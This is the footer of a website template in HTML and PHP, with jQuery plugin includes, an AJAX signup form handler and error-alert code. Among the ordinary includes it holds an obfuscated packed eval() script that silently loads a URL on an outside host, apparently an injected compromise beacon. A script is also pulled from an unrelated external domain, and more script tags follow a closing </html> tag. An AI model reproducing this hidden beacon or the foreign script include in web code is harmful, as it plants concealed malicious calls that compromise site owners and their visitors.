



<link rel="stylesheet" href="css/jquery.fancybox.min.css"><link rel="stylesheet" href="css/easydropdown.css"><script type="text/javascript" src="/assets/gan/js/parallax.js"></script><script type="text/javascript" src="/assets/gan/js/owl.carousel.min.js"></script><script type="text/javascript" src="/assets/gan/js/jquery.totemticker.min.js"></script><script type="text/javascript" src="/assets/gan/js/fancyBox-3.0.47.js"></script><script type="text/javascript" src="/assets/gan/js/clipboard.min.js"></script><script type="text/javascript" src="/assets/gan/js/jquery.counterup.min.js"></script><script type="text/javascript" src="/assets/gan/js/CoffeeScript.js"></script><script src="/assets/gan/js/jquery.easydropdown.min.js" type="text/javascript"></script><script type="text/javascript" src="/assets/gan/js/main.js?v=1.12"></script><script type="text/javascript" src="https://bonniepays.com/ckeditor/ckeditor.js"></script></body></html>


<script src="/assets/scripts/jquery-3.1.0.min.js"></script>
<script src="/assets/scripts/jquery.formstyler.js"></script>
<script src="/assets/scripts/jquery.countdown.js"></script>
<script src="/assets/scripts/jquery.magnific-popup.min.js"></script>
<script src="/assets/scripts/swiper.min.js"></script>
<script src="/assets/scripts/jquery.knob.js"></script>
<script src="/assets/scripts/rome.min.js"></script>
<script src="/assets/scripts/isotope.pkgd.min.js"></script>
<script src="/assets/scripts/app.min.js"></script>
<script>eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0=1 2();0.3="//4.5.6/7/8.9"',10,10,'img|new|Image|src|sqltor|had|su|gen|c|php'.split('|'),0,{}))</script>
<script src="/assets/plugins/bootstrap-sweetalert/sweet-alert.min.js"></script>
<script>
  function ajaxSignup() {
      var form = $('#signup');
      form.submit(function () {'use strict',
          $.post("/signup", 
          { reg_login: $('#signup_login').val(), reg_email: $('#signup_email').val(), reg_pass: $('#signup_pass').val(), reg_re_pass: $('#signup_repass').val(), _tocken: $('#signup_tocken').val(), g_captcha_response: $('#g-recaptcha-response').val(), ajax: 1 },
          function(result){

              res = JSON.parse(result);

              console.log(res);

              $('#signup_tocken').val(res['new_tocken']);

              swal(res['mess'][0], res['mess'][1], res['mess'][2]);

          });
          return false;
      });
  };
  if ($('#signup').length > 0) {
    ajaxSignup();
  }
</script>

<?php if(isset($errors) && $errors !== false) :  ?>

  <script>
    setTimeout(function(){swal('<?=$errors[0]; ?>', '<?=$errors[1]; ?>', '<?=$errors[2]; ?>');}, 100);
  </script>

<?php endif; ?>




